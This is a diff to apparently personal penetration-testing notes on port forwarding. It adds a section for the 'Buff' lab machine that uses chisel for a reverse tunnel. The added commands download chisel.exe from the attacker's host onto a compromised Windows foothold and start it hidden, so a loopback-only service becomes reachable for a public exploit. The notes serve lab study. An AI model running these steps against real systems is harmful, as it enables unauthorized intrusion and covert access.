@@ -751,7 +751,32 @@ Proxifier.exe → Profile → Proxy Servers → Add: 127.0.0.1:1080, SOCKS5
 # Open mstsc.exe → connect to final target (routes via SocksOverRDP channel)
 ```
 
-#### Tags: #CommandAppendix #PortForwarding #SSHTunneling #Pivoting #Socat #sshuttle #Proxychains #Plink #Netsh #Meterpreter #autoroute #Rpivot #Dnscat2 #Chisel #ptunnel-ng #ICMP #SocksOverRDP #Proxifier #ProxyCommand #Ncat #DPI #HTTPTunnel #DNSTunnel #Module19 #Module20 #HTBSupplementary #DualRemote #ReverseSocks #Module27
+## Buff: one-port reverse mapping to a Windows loopback service
+
+~~~bash
+# Kali:
+chisel server -p $ChiselPort --reverse
+
+# BUFF, from the foothold:
+iwr http://$LocalIP:$WebPort/chisel.exe -OutFile C:/Users/Public/chisel.exe
+Start-Process -WindowStyle Hidden -FilePath C:/Users/Public/chisel.exe -ArgumentList 'client $LocalIP:$ChiselPort R:$InternalPort:127.0.0.1:$InternalPort'
+
+# Kali verification:
+nmap -sT -sV -Pn -n -p $InternalPort 127.0.0.1
+~~~
+
+Use this when a service is bound to 127.0.0.1 and the public exploit expects
+that address. The R mapping makes the local Kali port reach the target-side
+loopback port. Kill stale Windows clients before replacing the binary:
+
+~~~cmd
+taskkill /F /IM chisel.exe
+~~~
+
+See [[RUNBOOK V2/Windows - Port Forwarding]] and
+[[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]].
+
+#### Tags: #CommandAppendix #PortForwarding #SSHTunneling #Pivoting #Socat #sshuttle #Proxychains #Plink #Netsh #Meterpreter #autoroute #Rpivot #Dnscat2 #Chisel #ptunnel-ng #ICMP #SocksOverRDP #Proxifier #ProxyCommand #Ncat #DPI #HTTPTunnel #DNSTunnel #Module19 #Module20 #HTBSupplementary #DualRemote #ReverseSocks #Module27 #Buff
 ## External Resources
 
 - [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
